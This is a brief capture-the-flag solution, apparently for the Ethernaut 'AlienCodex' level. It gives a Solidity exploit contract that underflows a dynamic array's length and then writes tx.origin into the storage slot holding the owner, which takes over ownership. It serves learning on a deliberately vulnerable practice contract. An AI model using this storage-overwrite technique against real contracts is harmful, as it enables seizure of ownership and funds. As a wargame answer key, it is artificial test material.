Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface AlienCodex {
    function revise(uint, bytes32) external;
    function make_contact() external; 
    function retract() external;
}

contract Exploit {

    function exploit (address _who) public {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        AlienCodex(_who).make_contact();
        AlienCodex(_who).retract();
        AlienCodex(_who).revise(index, myAddress);
    }
}
```
Call exploit() sending your contract instance
